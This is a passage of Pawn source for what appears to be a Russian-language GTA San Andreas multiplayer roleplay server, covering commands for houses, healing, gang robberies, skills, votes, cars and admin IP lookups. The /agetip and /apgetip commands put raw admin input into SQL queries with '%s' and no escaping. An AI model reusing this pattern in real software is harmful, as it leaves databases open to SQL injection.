		PlayerPlaySound(playerid, 1145, 0.0, 0.0, 0.0);
		return true;
	}
	if(HouseInfo[bouse][hLock] == 0)
	{
		HouseInfo[bouse][hLock] = 1;
		GameTextForPlayer(playerid, "~w~House ~r~LOCK", 5000, 3);
		PlayerPlaySound(playerid, 1145, 0.0, 0.0, 0.0);
		return true;
	}
	return true;
}
CMD:sellhouse(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(!HGet(playerid)) return true;
	new bouse = PTEMP[playerid][pPHouseKey];
	if(!PlayerToPoint(10, playerid,HouseInfo[bouse][hExitx], HouseInfo[bouse][hExity], HouseInfo[bouse][hExitz])) return SCM(playerid, COLOR_GREY, " Нужно находиться внутри дома, чтобы его продать. (Нужно находиться возле выхода)");
	if(GetPlayerVirtualWorld(playerid) != bouse+50) return true;
	ShowPlayerDialogEx(playerid,5032,DIALOG_STYLE_MSGBOX, "Предупреждение", "Вы действительно хотите продать дом?", "Да", "Нет");
	return true;
}
CMD:healme(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	for(new i = 1; i <= TotalHouse; i++)
	{
		if(!PlayerToPoint(5, playerid,HouseInfo[i][hExitx], HouseInfo[i][hExity], HouseInfo[i][hExitz])) continue;
		if(GetPlayerVirtualWorld(playerid) != i+50) continue;
		if(HouseInfo[i][hHel] == 0)return SCM(playerid, COLOR_GRAD1, "В этом месте нет аптечек");
		if(GetPVarInt(playerid,"_Hel") >= 10) return SCM(playerid,COLOR_GREY," Только 10 штук в час!");
		if(PTEMP[playerid][pHP] >= 100) return SCM(playerid, COLOR_GREY," Вы здоровы");
		SCM(playerid, -1, " Вы были вылечены на 25 процентов");
		format(YCMDstr, sizeof(YCMDstr), " Осталось %i аптечек", HouseInfo[i][hHel]-1);
		SCM(playerid, COLOR_BLUE, YCMDstr);
		HouseInfo[i][hHel] -= 1;
		SetPlayerHealthAC(playerid, PTEMP[playerid][pHP] + 25.0);
		if(PTEMP[playerid][pHP] > 100) SetPlayerHealthAC(playerid, 100.0);
		SetPlayerChatBubble(playerid, "Использовал(а) аптечку", COLOR_PURPLE, 30.0, 10000);
		SetPVarInt(playerid,"_Hel",GetPVarInt(playerid,"_Hel")+1);
		return true;
	}
	if(IsAMedKit(playerid))
	{
		new _null;
		switch(PTEMP[playerid][pMember])
		{
		case 12: _null = ballashel; case 13: _null = vagoshel; case 15: _null = groovhel;
		case 17: _null = aztekhel; case 18: _null = rifahel; case 6: _null = yakuzahel;
		case 5: _null = lcnhel; case 14: _null = rmhel;
		}
		if(_null <= 0) return SCM(playerid, COLOR_GRAD1, " На базе нет аптечек");
		if(PTEMP[playerid][pHP] >= 100) return SCM(playerid, COLOR_GREY," Вы здоровы");
		SCM(playerid, -1, " Вы были вылечены на 25 процентов");
		format(YCMDstr, 64, " Осталось %i аптечек", _null-1);
		SCM(playerid, COLOR_BLUE, YCMDstr);
		switch(PTEMP[playerid][pMember])
		{
		case 12: ballashel--; case 13: vagoshel--; case 15: groovhel--;
		case 17: aztekhel--; case 18: rifahel--; case 6: yakuzahel--;
		case 5: lcnhel--; case 14: rmhel--;
		}
		SetPlayerHealthAC(playerid, PTEMP[playerid][pHP] + 25.0);
		if(PTEMP[playerid][pHP] > 100) SetPlayerHealthAC(playerid, 100.0);
		SetPlayerChatBubble(playerid, "Использовал(а) аптечку", COLOR_PURPLE, 30.0, 10000);
	}
	return true;
}
CMD:robhouse(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(!IsAGang(playerid)) return SCM(playerid,COLOR_GREY," Вы не состоите в банде");
	for(new h = 1; h <= TotalHouse; h++)
	{
		for(new i =1; i <= TOTALGZ; i++)
		{
			if(PlayerToKvadrat(playerid,GZInfo[i][gCoords][0], GZInfo[i][gCoords][1],GZInfo[i][gCoords][2],GZInfo[i][gCoords][3]) && PTEMP[playerid][pMember] == GZInfo[i][gFrakVlad])
			{
				if(!PlayerToPoint(2.0, playerid, HouseInfo[h][hEntrancex], HouseInfo[h][hEntrancey], HouseInfo[h][hEntrancez])) continue;
				if(robhouse[h] != false) return SCM(playerid, COLOR_GREY, "Этот дом уже был ограблен в этом часу");
				if(strcmp(HouseInfo[h][hOwner],"None",true) == 0) return SCM(playerid, COLOR_GREY, " У дома нет владельца");
				if(!IsPlayerConnected(GetPlayerID(HouseInfo[h][hOwner]))) return SCM(playerid, COLOR_GREY, "Владелец дома OFF-LINE");
				SCM(playerid, COLOR_GREEN, " Вы ограбили дом, везите материалы в доки (( /gps >> [0] Важное >> [6] Приём металла ))");
				SCM(GetPlayerID(HouseInfo[h][hOwner]),COLOR_REDD," Ваш дом ограбили! С вашего счета было списано 500 вирт на востановление труб и оплату энергии");
				PTEMP[playerid][pZakonp] -= 1;
				robh[playerid] = true;
				robhouse[h] = true;
				HouseInfo[h][hTakings] -= 500;
				PTEMP[playerid][pGRating] += 100;
				switch(PTEMP[playerid][pMember])
	            {
	                case 12: gRating[Ballas] += 100;
	                case 13: gRating[Vagos]  += 100;
	                case 15: gRating[Grove]  += 100;
	                case 17: gRating[Aztec]  += 100;
	                case 18: gRating[Rifa]   += 100;
	            }
			}
		}
	}
	return true;
}
CMD:getskill(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 1 || dostup[playerid] == 0) return true;
	if(sscanf(params, "u",params[0])) return SCM(playerid, -1, " Введите: /getskill [ид]");
	new stringskill[850];
	new points[6],percent[2] = "%";
	points[0] = 100 - PTEMP[params[0]][pGunSkill][0];
	points[1] = 100 - PTEMP[params[0]][pGunSkill][1];
	points[2] = 100 - PTEMP[params[0]][pGunSkill][2];
	points[3] = 100 - PTEMP[params[0]][pGunSkill][3];
	points[4] = 100 - PTEMP[params[0]][pGunSkill][4];
	points[5] = 100 - PTEMP[params[0]][pGunSkill][5];
	format(stringskill,sizeof(stringskill), "<< Навыки владения оружием >>\n\nSDPistol:\t[%s]%i%s\nDeserd eagle:\t[%s]%i%s\nShotGun:\t[%s]%i%s\nMP5\t\t[%s]%i%s\nAK47:\t\t[%s]%i%s\nM4A1:\t\t[%s]%i%s",
	ToDevelopSkills(PTEMP[params[0]][pGunSkill][0],points[0]),PTEMP[params[0]][pGunSkill][0],percent,
	ToDevelopSkills(PTEMP[params[0]][pGunSkill][1],points[1]),PTEMP[params[0]][pGunSkill][1],percent,
	ToDevelopSkills(PTEMP[params[0]][pGunSkill][2],points[2]),PTEMP[params[0]][pGunSkill][2],percent,
	ToDevelopSkills(PTEMP[params[0]][pGunSkill][3],points[3]),PTEMP[params[0]][pGunSkill][3],percent,
	ToDevelopSkills(PTEMP[params[0]][pGunSkill][4],points[4]),PTEMP[params[0]][pGunSkill][4],percent,
	ToDevelopSkills(PTEMP[params[0]][pGunSkill][5],points[5]),PTEMP[params[0]][pGunSkill][5],percent);
	ShowPlayerDialogEx(playerid,1100,DIALOG_STYLE_MSGBOX, " ",stringskill, "Готово", "");
	return true;
}
CMD:myskill(playerid)
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	new stringskill[850];
	new points[6],percent[2] = "%";
	points[0] = 100 - PTEMP[playerid][pGunSkill][0];
	points[1] = 100 - PTEMP[playerid][pGunSkill][1];
	points[2] = 100 - PTEMP[playerid][pGunSkill][2];
	points[3] = 100 - PTEMP[playerid][pGunSkill][3];
	points[4] = 100 - PTEMP[playerid][pGunSkill][4];
	points[5] = 100 - PTEMP[playerid][pGunSkill][5];
	format(stringskill,sizeof(stringskill), "<< Навыки владения оружием >>\n\nSDPistol:\t[%s]%i%s\nDeserd eagle:\t[%s]%i%s\nShotGun:\t[%s]%i%s\nMP5\t\t[%s]%i%s\nAK47:\t\t[%s]%i%s\nM4A1:\t\t[%s]%i%s",
	ToDevelopSkills(PTEMP[playerid][pGunSkill][0],points[0]),PTEMP[playerid][pGunSkill][0],percent,
	ToDevelopSkills(PTEMP[playerid][pGunSkill][1],points[1]),PTEMP[playerid][pGunSkill][1],percent,
	ToDevelopSkills(PTEMP[playerid][pGunSkill][2],points[2]),PTEMP[playerid][pGunSkill][2],percent,
	ToDevelopSkills(PTEMP[playerid][pGunSkill][3],points[3]),PTEMP[playerid][pGunSkill][3],percent,
	ToDevelopSkills(PTEMP[playerid][pGunSkill][4],points[4]),PTEMP[playerid][pGunSkill][4],percent,
	ToDevelopSkills(PTEMP[playerid][pGunSkill][5],points[5]),PTEMP[playerid][pGunSkill][5],percent);
	ShowPlayerDialogEx(playerid,1100,DIALOG_STYLE_MSGBOX, " ",stringskill, "Готово", "");
	return true;
}
CMD:pskill(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pJob] != 5) return true;
	new stringskill[512];
	new points[1],percent[2] = "%";
	points[0] = 100 - PTEMP[playerid][pPProc];
	format(stringskill,sizeof(stringskill), "{FFFFFF}Уровень: %d\n{2E8F1A}Опыт:\t[%s]%i%s\n{FFFFFF}Макс.Груз: %d",
	PTEMP[playerid][pPSkill],
	ToDevelopSkills(PTEMP[playerid][pPProc],points[0]),PTEMP[playerid][pPProc],percent,
	PTEMP[playerid][pPMGruz]);
	ShowPlayerDialogEx(playerid,1100,DIALOG_STYLE_MSGBOX, "Статистика",stringskill, "Готово", "");
	return true;
}
CMD:atune(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if (PTEMP[playerid][pAdmin] < 3 || dostup[playerid] == 0) return true;
	if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SCM(playerid, COLOR_GREY, " Вы не за рулем");
	ShowPlayerDialogEx(playerid, 8004, 2, "Тюнинг меню", "Диски \nГидравлика \nАрхангел Тюнинг \nЦвет \nВинилы \nАзот", "Выбрать", "Назад");
	return true;
}
CMD:setskill(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 7 || dostup[playerid] == 0) return true;
	if(sscanf(params, "udd",params[0],params[1],params[2]))
	{
		SCM(playerid, COLOR_GRAD1, " Введите: /setskill [playerid/часть ника] [номер] [количество]");
		SCM(playerid, COLOR_GRAD4, "[0] Slinced Pistol |[1] Desert Eagle |[2] ShotGun |[3] MP5 |[4] AK47 |[5] M4A1");
		return true;
	}
	if(params[1] > 6 || params[1] < 0) return SCM(playerid,COLOR_GREY," Неизвестное значение");
	if(!IsPlayerConnected(params[0])) return true;
	PTEMP[params[0]][pGunSkill][params[1]] = params[2];
	SCM(playerid, COLOR_GRAD1, " Уровень владения оружием игроку установлен");
	SetPlayerSkills(playerid);
	return true;
}
CMD:setskills(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 7 || dostup[playerid] == 0) return true;
	if(sscanf(params, "udd",params[0]))
	{
		SCM(playerid, COLOR_GREY, " Введите: /setskills [playerid]");
		return true;
	}
	if(!IsPlayerConnected(params[0])) return true;
	for(new x = 0; x < 6; x++)
	PTEMP[params[0]][pGunSkill][x] = 100;
	SCM(playerid, COLOR_GRAD1, " Уровень владения оружием игроку установлен");
	SetPlayerSkills(playerid);
	return true;
}
CMD:sellgrib(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	for(new i = 1; i <= TotalBizz; i++)
	{
		if(PTEMP[playerid][pMushrooms] == 0) return SCM(playerid, -1, " У Вас нет грибов");
		if (PlayerToPoint(10, playerid,BizzInfo[i][bBarX], BizzInfo[i][bBarY], BizzInfo[i][bBarZ]) && BizzInfo[i][bType] == 2 && GetPlayerVirtualWorld(playerid) == BizzInfo[i][bVirtualWorld])
		{
			PTEMP[playerid][pCash] +=PTEMP[playerid][pMushrooms]*25;
			BizzInfo[i][bProducts]+=PTEMP[playerid][pMushrooms];
			format(YCMDstr,sizeof(YCMDstr), " Вы продали %i грибов. Выручка: %i вирт",PTEMP[playerid][pMushrooms],PTEMP[playerid][pMushrooms]*25);
			SCM(playerid,-1,YCMDstr);
			PTEMP[playerid][pMushrooms] = 0;
		}
	}
	return true;
}
CMD:createvote(playerid, params[])
{
	if(PTEMP[playerid][pAdmin] < 5) return true;
	if(GL2[goloson] == true) return SendClientMessage(playerid,COLOR_GREY," Голосование уже созданно");
	ShowPlayerDialogEx(playerid,1132,1,"Создание голосования","Введите вопрос для голосования:","Далее","Отмена");
	pickupalla = 0;
	return true;
}
CMD:addvote(playerid, params[])
{
	if(PTEMP[playerid][pAdmin] < 5) return true;
	if(GL2[goloson] == false) return SendClientMessage(playerid,COLOR_GREY," Голосование не создано!");
	new Float:pox,Float:poy,Float:poz;
	new z = pickupalla;
	GetPlayerPos(playerid,pox,poy,poz);
	LPick[z] = CreateDynamicPickup(19134,23,pox,poy,poz);
	GLT[z] = CreateDynamic3DTextLabel(GL2[NameGolos],0x03c03cFF, pox, poy, poz + 0.64,10);
	pickupalla++;
	return 1;
}
CMD:stopvote(playerid,params[])
{
	if(PTEMP[playerid][pAdmin] < 5) return true;
	if(GL2[goloson] == false) return SendClientMessage(playerid,COLOR_GREY," Голосование не создано!");
	new str[256];
	SendClientMessage(playerid, -1, " Голосование остановлено");
	format(YCMDstr, sizeof(YCMDstr), "Номер\tВариант\tКол-во\n");
	for(new i = 0;i < idgols; i++)
	{
		format(str,sizeof(str),"%i\t%s\t%i голосов\n",i, Golosovan[i][Variant],Golosovan[i][Golosov]);
		strcat(YCMDstr, str, sizeof(YCMDstr));
	}
	ShowPlayerDialogEx(playerid, 1137, DIALOG_STYLE_TABLIST_HEADERS, "Голосование", YCMDstr, "Закрыть", "");
	for(new j;j<20;j++)
	{
		DestroyDynamicPickup(LPick[j]);
		DestroyDynamic3DTextLabel(GLT[j]);
	}
	for(new g = 0;g < MAX_PLAYERS; g++)
	{
		PTEMP[g][progolos] = false;
	}
	idgols = 0;
	pickupalla = 0;
	GL2[goloson] = false;
	mysql_format(DATABASE, QUERY, 128, "UPDATE `"TABLE_ACCOUNTS"` SET `progolos` = '0'");
	mysql_function_query(DATABASE,QUERY,false,"","");
	return true;
}
CMD:votelist(playerid, params[])
{
	if(PTEMP[playerid][pAdmin] < 5) return true;
	if(GL2[goloson] == false) return SendClientMessage(playerid,COLOR_GREY," Голосование не создано!");
	new str[256];
	format(YCMDstr, sizeof(YCMDstr), "Номер\tВариант\tКол-во\n");
	for(new i = 0; i < idgols; i++)
	{
		format(str,sizeof(str),"%i\t%s\t%i голосов\n",i, Golosovan[i][Variant],Golosovan[i][Golosov]);
		strcat(YCMDstr, str, sizeof(YCMDstr));
	}
	ShowPlayerDialogEx(playerid, 1137, DIALOG_STYLE_TABLIST_HEADERS, "Голосование", YCMDstr, "Закрыть", "");
	return true;
}
CMD:apaint(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 5 || dostup[playerid] == 0) return true;
	if(paint_info[1] == 1) return SCM(playerid,COLOR_GREY," Пейнтболл уже запущен");
	paint_info[0] = 121;
	paint_info[1] = 1;
	foreach(i) DeletePVar(i, "player_paint");
	return true;
}
CMD:arace(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 5 || dostup[playerid] == 0) return true;
	if(race_info[1] == 1) return SCM(playerid,COLOR_GREY," Гонка уже запущена");
	race_info[0] = 121;
	race_info[1] = 1;
	return true;
}
/*
CMD:drace(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 5 || dostup[playerid] == 0) return true;
	if(EndingderbyRound == 0) return SCM(playerid,-1, "Дерби Гонка уже начата!");
	OOCOff(TEAM_GROVE_COLOR,"Внимание! Начало гонок дерби через 5 минут. Стадион Сан Фиерро. Регистрация на первом этаже");
	EndingderbyRound = 0;
	SetTimer("DerbyStartRacetwo", 180000, 0);
	return true;
}
*/
//#10
CMD:fixcar(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pCash] < 1000) return SCM(playerid, -1, " Не достаточно денег!");
	if(IsVehicleOccupied(house_car[playerid]) != -1) return SCM(playerid,COLOR_GREY," Транспорт занят игроком");
	new h = GetPVarInt(playerid, "chosencar");
	new i = PTEMP[playerid][pPHouseKey];
	if(PTEMP[playerid][pKvartiraKey] != 0 && PTEMP[playerid][pPHouseKey] == 9999)
	{
		if(PTEMP[playerid][pCash] < 2500) return SCM(playerid,COLOR_GREY," У вас недостаточно денег");
		DestroyVehicle(house_car[playerid]);
		house_car[playerid] = -1;
		PTEMP[playerid][pCash] -= 2500;
		GameTextForPlayer(playerid, "~g~car at your entryway~n~~r~$-2500", 5000, 1);
	}
	else if(PTEMP[playerid][pPHouseKey] != 9999 && HouseInfo[PTEMP[playerid][pPHouseKey]][hKlass] != 0 && HouseInfo[PTEMP[playerid][pPHouseKey]][hKlass] != 1)
	{
	    if(GetPVarInt(playerid, "CarsInGarage") == 1) return SCM(playerid, COLOR_GREY, " Все автомобили находятся в гараже");
		//if(house_car[playerid] == -1) house_car[playerid] = garage_car[playerid][0];
		if(GetPVarInt(playerid, "chosencar") == -1) SetPVarInt(playerid, "chosencar", 0);
		GameTextForPlayer(playerid, "~g~car at your home~n~~r~$-1000", 5000, 1);
		PTEMP[playerid][pCash] -= 1000;
		PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
		new Float:xx, Float:yy, Float:zz, Float:angle;
		SetPVarInt(playerid, "chosencar", -1);
		SetPVarInt(playerid, "CarsInGarage", 1);
		SetVehicleToRespawn(house_car[playerid]);
		GetVehiclePos(house_car[playerid], xx, yy, zz);
		GetVehicleZAngle(house_car[playerid], angle);
		if(house_car[playerid] != -1) DestroyVehicle(house_car[playerid]);
		house_car[playerid] = CreateVehicle(CarInfo[playerid][carModel][h],xx,yy,zz,angle,CarInfo[playerid][carColor_one][h] ,CarInfo[playerid][carColor_two][h], 86400);
		LinkVehicleToInterior(house_car[playerid], 19);
		SetVehicleVirtualWorld(house_car[playerid], i+100);
		SetVehicleParamsEx(house_car[playerid],false,false,false,true,false,false,false);
		CarHealth[house_car[playerid]] = float(1000);
		Fuell[house_car[playerid]] = CarInfo[playerid][carFuel][h];
		LoadTuning(playerid, house_car[playerid], GetPVarInt(playerid, "chosencar"));
	}
	else if(HouseInfo[PTEMP[playerid][pPHouseKey]][hKlass] == 0 || HouseInfo[PTEMP[playerid][pPHouseKey]][hKlass] == 1)
	{
	    GameTextForPlayer(playerid, "~g~car at your home~n~~r~$-1000", 5000, 1);
		PTEMP[playerid][pCash] -= 1000;
		PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
		new Float:xx, Float:yy, Float:zz, Float:angle;
	    SetVehicleToRespawn(garage_car[playerid][0]);
	    GetVehiclePos(garage_car[playerid][0], xx, yy, zz);
		GetVehicleZAngle(garage_car[playerid][0], angle);
		DestroyVehicle(garage_car[playerid][0]);
		garage_car[playerid][0] = CreateVehicle(CarInfo[playerid][carModel][0],xx,yy,zz,angle,CarInfo[playerid][carColor_one][0] ,CarInfo[playerid][carColor_two][0], 86400);
        LoadTuning(playerid,garage_car[playerid][0],0);
        SetVehicleParamsEx(garage_car[playerid][0],false,false,false,true,false,false,false);
		CarHealth[garage_car[playerid][0]] = float(1000);
		Fuell[garage_car[playerid][0]] = CarInfo[playerid][carFuel][h];
	}
 	else SCM(playerid, COLOR_GREY, " У вас нет дома");
	
	return true;
}
CMD:carpass(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	new textcar[64];
	if(!IsPlayerInAnyVehicle(playerid)) return SCM(playerid, COLOR_GRAD2, " Вы не в машине!");
	if(Vehicleforeach(GetPlayerVehicleID(playerid)) == -1 && caroff[GetPlayerVehicleID(playerid)] == 0) return SCM(playerid,COLOR_GREY," В бардачке этого транспортного средства нет документов");
	if(sscanf(params, "u",params[0]))
	{
		if(IsPlayerConnected(Vehicleforeach(GetPlayerVehicleID(playerid))) && caroff[GetPlayerVehicleID(playerid)] == 0)
		{
			SCM(playerid,0x59bd3aa, "-----------===[ VEHICLE PASSPORT ]===----------");
			format(textcar,sizeof(textcar), " Модель: %s",VehicleNames[GetVehicleModel(GetPlayerVehicleID(playerid))-400]);
			SCM(playerid,0xc5eefeaa, textcar);
			format(textcar,sizeof(textcar), " Владелец: %s",Name(Vehicleforeach(GetPlayerVehicleID(playerid))));
			SCM(playerid,0xc5eefeaa, textcar);
			format(textcar,sizeof(textcar), " Состояние: %i процентов",CarInfo[Vehicleforeach(GetPlayerVehicleID(playerid))][carPercent][GetPVarInt(Vehicleforeach(GetPlayerVehicleID(playerid)), "chosencar")]);
			SCM(playerid,0xc5eefeaa, textcar);
			SCM(playerid,0x59bd3aa, "=====================================");
			SetPlayerChatBubble(playerid,"Достал(а) документы из бардачка",COLOR_PURPLE,30.0,10000);
			format(YCMDstr, sizeof(YCMDstr), " %s достал(а) из бардачка документы",Name(playerid));
			ProxDetector(10.0, playerid, YCMDstr, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			return true;
		}
		else return SCM(playerid,COLOR_REDD," Владелеца машины нет в сети.");
	}
	if(!IsPlayerConnected(params[0])) return SCM(playerid,-1," Игрок не в сети");
	if(!ProxDetectorS(8.0, playerid, params[0])) return true;
	SCM(params[0],0x59bd3aa, "-----------===[ VEHICLE PASSPORT ]===----------");
	format(textcar,sizeof(textcar), " Модель: %s",VehicleNames[GetVehicleModel(GetPlayerVehicleID(playerid))-400]);
	SCM(params[0],0xc5eefeaa, textcar);
	format(textcar,sizeof(textcar), " Владелец: %s",Name(Vehicleforeach(GetPlayerVehicleID(playerid))));
	SCM(params[0],0xc5eefeaa, textcar);
	format(textcar,sizeof(textcar), " Состояние: %i процентов",CarInfo[Vehicleforeach(GetPlayerVehicleID(playerid))][carPercent][GetPVarInt(Vehicleforeach(GetPlayerVehicleID(playerid)), "chosencar")]);
	SCM(params[0],0xc5eefeaa, textcar);
	SCM(params[0],0x59bd3aa, "=====================================");
	format(YCMDstr,sizeof(YCMDstr), "Достал(а) документы из бардачка и показал их %s",Name(params[0]));
	SetPlayerChatBubble(playerid,YCMDstr,COLOR_PURPLE,30.0,10000);
	format(YCMDstr, sizeof(YCMDstr), " %s достал(а) документы из бардачка и показал их %s",Name(playerid),Name(params[0]));
	ProxDetector(10.0, playerid, YCMDstr, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
	return true;
}
CMD:sellcar(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	new null = -1;
	if(house_car[playerid] == -1) return SCM(playerid,COLOR_RED, "У вас нет автомобиля");
	if(CarInfo[playerid][carModel][GetPVarInt(playerid, "chosencar")] == 462) return SCM(playerid,COLOR_GRAD1, " Вы не можете продать мопед");
	if(GetPVarInt(playerid,"_changecar") || GetPVarInt(playerid,"changecar")) return SCM(playerid,COLOR_GREY," В данный момент вы не можете продать свой автомобиль!");
	for(new i = 0; i < sizeof(ShopCar); i++) if(CarInfo[playerid][carModel][GetPVarInt(playerid, "chosencar")] == ShopCar[i][0]) null = i;
	if(null == -1) return SCM(playerid,COLOR_GREY," Вы не можете продать данный автомобиль!");
	PTEMP[playerid][pBank]+=ShopCar[null][1]/2;
	format(string,40,"~w~car in sold~n~~g~$%i",ShopCar[null][1]/2);
	GameTextForPlayer(playerid,string, 5000, 3);
	RemoveTuning(playerid,house_car[playerid]);
	CarInfo[playerid][carPercent][GetPVarInt(playerid, "chosencar")] = 0;
	SCM(playerid,-1, " Вы продали свой автомобиль");
	CarInfo[playerid][carModel][GetPVarInt(playerid, "chosencar")] = 462;
	CarInfo[playerid][carColor_one][GetPVarInt(playerid, "chosencar")] = 203;
	CarInfo[playerid][carColor_two][GetPVarInt(playerid, "chosencar")] = 203;
	if(house_car[playerid] != -1)
	{
		DestroyVehicle(house_car[playerid]);
		house_car[playerid] = -1;
	}
	if(HGet(playerid))
	{
		new house = PTEMP[playerid][pPHouseKey];
		house_car[playerid] = CreateVehicle(CarInfo[playerid][carModel][GetPVarInt(playerid, "chosencar")], HouseInfo[house][hCarx], HouseInfo[house][hCary], HouseInfo[house][hCarz], HouseInfo[house][hCarc] , CarInfo[playerid][carColor_one][GetPVarInt(playerid, "chosencar")] ,CarInfo[playerid][carColor_two][GetPVarInt(playerid, "chosencar")], 86400);
		SetVehicleParamsEx(house_car[playerid],false,false,false,true,false,false,false);
		CarHealth[house_car[playerid]] = float(1000);
	}
	return true;
}
CMD:pgetip(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 4 || dostup[playerid] == 0) return true;
	new enterip[32];
	if(sscanf(params, "is[32]",params[0], enterip)) return SCM(playerid, -1, " Введите: /pgetip [части 1 - 4] [IP]");
	if(params[0] < 1 || params[0] > 4) return SCM(playerid, COLOR_GREY, " Частей может быть от 1 до 4");
	SCM(playerid, 0xC21D00AA, " Список IP:");

	foreach(i)
	{
		new playerIP[3][32], strIP[4], enterIP[4];
		GetPlayerIp(i, playerIP[0], 32);
		sscanf(playerIP[0], "p<.>iiii", strIP[0], strIP[1], strIP[2], strIP[3]);
		sscanf(enterip, "p<.>iiii", enterIP[0], enterIP[1], enterIP[2], enterIP[3]);
		switch(params[0])
		{
		    case 1: format(playerIP[1], 32, "%i", strIP[0]);
		    case 2: format(playerIP[1], 32, "%i.%i", strIP[0], strIP[1]);
		    case 3: format(playerIP[1], 32, "%i.%i.%i", strIP[0], strIP[1], strIP[2]);
		    case 4: format(playerIP[1], 32, "%i.%i.%i.%i", strIP[0], strIP[1], strIP[2], strIP[3]);
		}
		switch(params[0])
		{
		    case 1: format(playerIP[2], 32, "%i", enterIP[0]);
		    case 2: format(playerIP[2], 32, "%i.%i", enterIP[0], enterIP[1]);
		    case 3: format(playerIP[2], 32, "%i.%i.%i", enterIP[0], enterIP[1], enterIP[2]);
		    case 4: format(playerIP[2], 32, "%i.%i.%i.%i", enterIP[0], enterIP[1], enterIP[2], enterIP[3]);
		}
		if(!strcmp(playerIP[1], playerIP[2], true))
		{
			format(YCMDstr, sizeof(YCMDstr), " Nik [%s]   IP [%s]", Name(i), playerIP[0]);
			SCM(playerid, COLOR_BLUE, YCMDstr);
		}
	}
	return true;
}
CMD:sellzone(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	for(new i = 1; i <= TOTALGZ; i++)
	{
		if(PlayerToKvadrat(playerid,GZInfo[i][gCoords][0], GZInfo[i][gCoords][1],GZInfo[i][gCoords][2],GZInfo[i][gCoords][3]))
		{
			if(PTEMP[playerid][pLeader] != GZInfo[i][gFrakVlad]) return SCM(playerid, COLOR_GRAD1, " Вы не на своей зоне!");
			if(sscanf(params, "ud",params[0],params[1])) return SCM(playerid, -1, " Введите: /sellzone [id] [цена]");
			if(params[1] < 100000 || params[1] > 500000) { SCM(playerid, COLOR_GREY, "Цена должна быть: от 100000 до 500000!"); return true; }
			if(!IsPlayerConnected(params[0])) return true;
			if(!ProxDetectorS(8.0, playerid, params[0])) return true;
			if(params[0] == playerid) { SCM(playerid, COLOR_GREY, " Себе  нельзя!"); return true; }
			format(YCMDstr, sizeof(YCMDstr), " Вы предложили %s купить территорию за %i вирт",Name(params[0]),params[1]);
			SCM(playerid, 0x6495EDFF, YCMDstr);
			format(YCMDstr, sizeof(YCMDstr), " %s предлагает Вам купить территорию за %i вирт. (( Введите: /accept zone для покупки))",Name(playerid),params[1]);
			SCM(params[0], 0x6495EDFF, YCMDstr);
			ZoneOffer[params[0]] = playerid;
			sellzone[params[0]] = PTEMP[playerid][pMember];
			ZonePrice[params[0]] = params[1];
		}
	}
	return true;
}
CMD:agetip(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 4 || dostup[playerid] == 0) return true;
	if(sscanf(params, "s[42]",params[0])) return	SCM(playerid, -1, " Введите: /agetip [ник]");
	mysql_format(DATABASE,QUERY, 256, "SELECT * FROM `"TABLE_ACCOUNTS"` WHERE `Name` = '%s'",params[0]);
	mysql_function_query(DATABASE,QUERY,true,"OnMySQL_QUERY","iis",20,playerid,params[0]);
	return true;
}
CMD:apgetip(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 4) return true;
	new ips[42];
	if(sscanf(params, "s[42]", ips)) return SCM(playerid, -1, " Введите: /apgetip [IP]");
	mysql_format(DATABASE, QUERY, sizeof(QUERY), "SELECT * FROM `"TABLE_ACCOUNTS"` WHERE `pIp` = '%s' OR `pvIp` = '%s' OR `pIpReg` = '%s'", ips, ips, ips);
	mysql_query(DATABASE, QUERY);
	new r = cache_num_rows();
	if(r)//cache_num_rows(r))
	{
	    new Names[32], pIps[32], pvIps[32], pIpRegs[32];
		SCM(playerid, 0xC21D00AA, " Список IP:");
		for(new i = 0; i < r; i++)
		{
			new strin[256];
			cache_get_field_content(i,"Name",Names,DATABASE,60);
			cache_get_field_content(i,"pIp",pIps,DATABASE,60);
			cache_get_field_content(i,"pvIp",pvIps,DATABASE,60);
			cache_get_field_content(i,"pIpReg",pIpRegs,DATABASE,60);
            format(strin,sizeof(strin)," Nik [%s]   R-IP [%s]   L-IP [%s]   IP [%s]",Names, pIpRegs, pvIps, pIps);
			SCM(playerid, COLOR_BLUE, strin);
		}
	}
	else
	{
	    SCM(playerid, COLOR_GREY, " Совпадений не найдено");
	}
	return true;
}
CMD:atm(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	for(new i = 1; i <= TOTALATM; i++)
	{
